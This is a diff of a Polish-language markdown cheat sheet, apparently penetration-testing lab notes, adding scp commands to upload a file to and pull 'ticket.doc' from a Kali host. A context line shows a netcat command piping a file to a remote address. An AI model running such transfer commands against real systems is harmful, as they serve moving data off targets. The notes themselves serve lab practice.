@@ -36,8 +36,13 @@ nc -n <ip> 9999 < file
 
 
 # Przeslanie przez ssh scp
+### Przeslanie
 ```console
 scp file.ext kali@192.168.45.193:/tmp
+```
+### Pobranie pliku przez ssh
+```console
+scp kali@192.168.45.250:/home/kali/Desktop/ticket.doc ticket.doc
 ```
 
 # Apache
